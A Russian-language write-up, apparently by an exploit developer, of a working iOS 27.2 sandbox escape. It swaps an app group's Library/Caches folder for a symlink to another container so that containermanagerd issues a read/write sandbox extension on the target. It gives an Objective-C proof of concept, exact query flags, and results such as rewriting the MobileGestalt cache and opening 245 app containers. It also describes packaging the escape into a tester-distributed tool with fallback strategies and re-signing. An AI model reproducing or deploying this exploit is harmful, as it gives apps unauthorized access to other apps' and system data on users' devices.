# iOS 27.2 (24B115) — частичный sandbox escape через symlink part-каталога MCM

**Дата:** 8 ноября 2026, ~06:20 MSK  
**Устройство:** iPhone14,7 (iPhone 14, T8110), iOS 27.2 (24B115)  
**UDID:** REDACTED-UDID  
**Статус:** воспроизводимый read/write sandbox escape (не root, не kernel).

---

## TL;DR

На iOS 27.2 старый `bad_query` (traversal через `partDomain`) закрыт: сервер
`containermanagerd` проверяет `..` в `SystemDataDomain`, а `MCMFileManager
realPathForURL:ifChildOfURL:` отбивает symlink-и.

Остался обход через **сам part-каталог**:

1. Приложение имеет app group (`group.8e0bc870a21520b9.1`).
2. Его `Library/Caches` заменяется на symlink на **чужой контейнер**.
3. Выполняется MCM-запрос:
   - class 7 (app group),
   - group identifier = своя app group,
   - part 3 (`Library/Caches`),
   - `partDomain` **пустой**,
   - flags `0x8100000000` (includePath + extension type 3).
4. `containermanagerd` выдаёт sandbox extension на **symlink-resolved target**,
   не проверяя, что part-каталог находится внутри контейнера.
5. `sandbox_extension_consume` даёт read/write к цели.

Этим получены:

- **MobileGestalt**: чтение/запись
  `/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist`
  (10 740 байт, бинарный plist, `O_RDWR` — OK).
- **PosterBoard**: запись в
  `/var/mobile/Containers/Data/Application/967AA218-2C52-4D2B-B47F-2B20FC356783/Library/Application Support/PRBPosterExtensionDataStore/61/Extensions/.../descriptors`
  (WallpaperKit, Mercury, Photos — все три каталога).
- **245 app data контейнеров** перечислены и открыты (token issued для каждого).

Ограничение: цель должна быть **MCM-контейнером** (app data / app group /
SystemGroup). Произвольный `/var/mobile/Library/Preferences` токен не получает
(сервер проверяет, что resolved path — известный контейнер). POSIX DAC не
обходится: писать можно только туда, куда может писать `mobile`.

## 1. Что было сломано в bad_query

Старый PoC:

```objc
query_set_class(q, 13);
query_set_group_identifiers(q, xpc_string_create("systemgroup.com.apple.mobilegestaltcache"));
query_set_flags(q, 0x8100000000);
query_set_part(q, 3);
query_set_part_domain(q, "../../../../../../../../private/var/containers/Shared/SystemGroup/.../Library/Caches");
```

На 27.2:

- `SystemDataDomain` с `..` → `MCMXPCMessageQuery initWithXPCObject` логирует
  `Rejecting query with invalid partDomain` и query = NULL (error type 160/55).
- Прямой class-13 запрос без traversal **возвращает path**, но **token = NULL**:
  `MCMCommandQuery`/`MCMResultQuery` не выпускают extension для чужого
  system group без entitlement.
- Symlink в `partDomain` (`link_mg`, без `..`) → error 160/posix 20:
  `MCMFileManager realPathForURL:ifChildOfURL:` разворачивает symlink и
  отбивает absolute/outside target.

То есть обе двери старого PoC закрыты.

## 2. Новый обход: symlink на месте part-каталога

Ключевое отличие: `partDomain` пустой, поэтому проверка
`realPathForURL:ifChildOfURL:` для домена не вызывается. Проверяется только
сам контейнер (свой app group — разрешён), а `Library/Caches` уже подменён
symlink-ом.

### PoC (упрощённо)

```objc
// 1. Своя app group
NSURL *g = [NSFileManager.defaultManager
    containerURLForSecurityApplicationGroupIdentifier:@"group.8e0bc870a21520b9.1"];
NSString *lib = [g.path stringByAppendingPathComponent:@"Library"];
NSString *caches = [lib stringByAppendingPathComponent:@"Caches"];

// 2. Бэкап и symlink на цель
rename(caches.fileSystemRepresentation,
       [lib stringByAppendingPathComponent:@"Caches.bq_orig"].fileSystemRepresentation);
symlink(target.fileSystemRepresentation, caches.fileSystemRepresentation);

// 3. MCM query
void *q = container_query_create();
container_query_set_class(q, 7);
container_query_set_group_identifiers(q, xpc_string_create("group.8e0bc870a21520b9.1"));
container_query_operation_set_part(q, 3);          // Library/Caches
container_query_operation_set_flags(q, 0x8100000000ULL);
void *res = container_query_get_single_result(q);
char *tok = container_copy_sandbox_token(res);     // token = YES
int64_t h = sandbox_extension_consume(tok);         // h = 2

// 4. Цель доступна
int fd = open([[caches stringByAppendingPathComponent:@"com.apple.MobileGestalt.plist"]
               fileSystemRepresentation], O_RDWR);
```

### Почему это работает

- `container_query_operation_set_flags(q, 0x8100000000)`:
  - bit 32 (`0x100000000`) — includePath;
  - bit 39 (`0x8000000000`) — extension type 3 (read/write).
- `part = 3` → `MCMContainerPath urlForPart:partDomain:` строит
  `<container>/Library/Caches`.
- `partDomain` пустой → `realPathForURL:ifChildOfURL:` для partDomain не
  вызывается.
- Sandbox extension выпускается на path, который ядро резолвит через symlink
  → target vnode.
- `container_copy_sandbox_token` возвращает валидный токен; `consume` даёт
  доступ к target.

## 4. Ограничения

1. **Не root и не kernel.** Это sandbox extension, не DAC/kernel bypass.
2. **Цель — MCM-контейнер.** `/var/mobile/Library/Preferences` токен не
   получает (`token=NO`): сервер проверяет, что resolved path принадлежит
   известному контейнеру.
3. **Нужна своя app group** (в профиле ipa_dark есть
   `group.8e0bc870a21520b9.1`). Без app group класс 7 недоступен; можно
   использовать свой app data container (class 2) — требуется проверка.
4. **POSIX-права mobile** всё ещё действуют: запись возможна только в
   mobile-writable файлы/каталоги.
5. **App ID профиля** — `app.lake9674.aquila8809`; подпись ipa_dark.
6. Системные приложения и их контейнеры (включая PosterBoard) находятся по
   сигнатуре каталога, а не по bundle ID: metadata-файл контейнера
   `.com.apple.mobile_container_manager.metadata.plist` из sandbox не
   читается (nil), поэтому используется скан по
   `Library/Application Support/PRBPosterExtensionDataStore`.

## 9. Портируемость на другие устройства (27.0.1–27.2)

Примитив работает только если у приложения есть **app group**: class 7
запрашивает контейнер своей app group, а затем symlink part-каталога
(`Library/Caches`) уводит extension на target. Старая версия была жёстко
привязана к `group.8e0bc870a21520b9.1`, которую выдаёт только профиль
ipa_dark. У тестеров с другими профилями группы нет — поэтому «работает
только у меня».

Что сделано в BQTool:

1. **Динамическое определение app group**:
   - `SecTaskCreateFromSelf` + `SecTaskCopyValueForEntitlement`
     (`com.apple.security.application-groups`), fallback — разбор
     `embedded.mobileprovision`.
   - Берётся первая группа, `containerURLForSecurityApplicationGroupIdentifier`
     даёт контейнер, class-7 query использует её.
   - Никакого hardcoded group ID.
2. **Проверка class 2 (own app data) как fallback**:
   - part-пути на 27.2: p2 = `Library/Preferences`, p3 = `Library/Caches`,
     p4 = `Documents`, p5 = `tmp`, p6 = `SystemData`.
   - `rename()` любого из этих каталогов из sandbox возвращает `EPERM`
     (errno 1), включая `tmp` и `Documents`. Поэтому class 2 как база не
     подходит; нужна именно app group.
3. **Подпись тестеров**:
   - `sign_for_profile.sh` берёт из профиля `application-identifier`,
     `com.apple.security.application-groups`, team-id; подставляет bundle id
     и подписывает IPA.
   - Если в профиле нет app group — скрипт завершается с ошибкой.
   - Бесплатные Apple ID профили часто без app group; нужен ipa_dark или
     платный сертификат/профиль с app groups.
4. **Диагностика**:
   - лог `Documents/bqtool.log`: iOS build, bundle, group id, group root,
     class7 `result/token/consume`, PB scan.
   - Settings → Run Diagnostics проверяет MG read/write и ищет PosterBoard.
   - При отсутствии app group приложение показывает предупреждение.

Если у тестера всё ещё не работает — нужен его `bqtool.log`. По первым
строкам видно: нет группы / class7 не выдал token / target не открылся.
Это отделит проблему подписи от проблемы версии iOS.

### Multi-strategy в BQTool 2.1

Чтобы покрыть 27.0.1–27.2, `BQEscape` теперь пробует по порядку:

1. **class13 traversal** — старый bad_query (`SystemDataDomain` traversal).
   На 27.2 сервер отклоняет `..`; на 27.0.x может работать **без app group**.
2. **class7 symlink** — текущий 27.2 primitive (нужна app group).
3. **class13 direct** — прямой запрос SystemGroup (если на сборке выдают token).
4. **class12 geod traversal** — старый geod-маршрут.

Каждая попытка логируется:

```
strategy class13-traversal: ... result=0x... token=NO consume=-5
strategy class7-symlink: ... token=YES consume=N
escape: using class7 symlink
```

`-5` в коде означает: MCM-запрос вернул результат, но sandbox-token не выдан
или `consume` не прошёл. Это не ошибка установки. Если тестер видит «error 5»
в установщике — это подпись/профиль (UDID, срок, app group), а не primitive.

Если у тестера 27.0.1/27.1 traversal сработал — приложение работает даже без
app group. Если все стратегии вернули -5 — нужен его лог, чтобы понять, какая
именно дверь закрыта на этой сборке.
